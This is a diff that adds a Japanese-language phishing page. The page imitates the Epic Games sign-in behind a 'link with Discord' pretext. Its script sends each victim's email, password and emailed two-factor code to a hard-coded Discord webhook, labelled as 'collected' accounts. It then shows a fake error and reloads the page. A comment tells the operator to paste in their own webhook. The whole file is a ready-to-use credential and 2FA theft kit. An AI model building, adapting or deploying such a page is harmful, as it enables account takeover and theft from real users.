@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>サインイン | Epic Games</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: white;
+            font-family: 'Open Sans', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #202020;
+            padding: 40px;
+            border-radius: 4px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        h2 { margin-bottom: 20px; font-weight: bold; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #404040;
+            border: 1px solid #404040;
+            color: white;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078f2;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+        button:hover { background-color: #005bb5; }
+        .hidden { display: none; }
+        .discord-btn { background-color: #5865F2; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Logo" width="40">
+    
+    <div id="step-start">
+        <h2>連携して開始</h2>
+        <p style="font-size: 14px; color: #ccc;">サービスを利用するにはDiscordとの連携が必要です。</p>
+        <button class="discord-btn" onclick="goToLogin()">DISCORDで認証</button>
+    </div>
+
+    <div id="step-login" class="hidden">
+        <h2>サインイン</h2>
+        <input type="email" id="email" placeholder="メールアドレス" required>
+        <input type="password" id="password" placeholder="パスワード" required>
+        <button onclick="sendLogin()">サインイン</button>
+    </div>
+
+    <div id="step-2fa" class="hidden">
+        <h2>二段階認証</h2>
+        <p style="font-size: 14px; color: #ccc;">メールに送信された6桁のセキュリティコードを入力してください。</p>
+        <input type="text" id="twofa" placeholder="000000" maxlength="6" required>
+        <button onclick="send2FA()">認証する</button>
+    </div>
+</div>
+
+<script>
+    // ★ここに自分のWebhook URLを貼る！
+    const webhookUrl = "https://discord.com/api/webhooks/1467497007139655792/fWG4s2fmCekiP-zZLzuCZmExuSybnX5Pfl4GxlbAHxzAgyeDhIy3D8KMqDTWbhviKE_4";
+
+    let savedEmail = "";
+
+    function goToLogin() {
+        // ボタンを押したらEpicログインに切り替える
+        document.getElementById('step-start').classList.add('hidden');
+        document.getElementById('step-login').classList.remove('hidden');
+    }
+
+    function sendLogin() {
+        savedEmail = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🔥 **Epicアカウント回収！**\n📧 メール: ${savedEmail}\n🔑 パス: ${pass}`
+            })
+        }).then(() => {
+            document.getElementById('step-login').classList.add('hidden');
+            document.getElementById('step-2fa').classList.remove('hidden');
+        });
+    }
+
+    function send2FA() {
+        const code = document.getElementById('twofa').value;
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🔑 **2FAコード回収！**\n📧 対象: ${savedEmail}\n🔢 コード: ${code}`
+            })
+        }).then(() => {
+            alert("エラーが発生しました。時間を置いてからやり直してください。");
+            location.reload();
+        });
+    }
+</script>
+
+</body>
+</html>
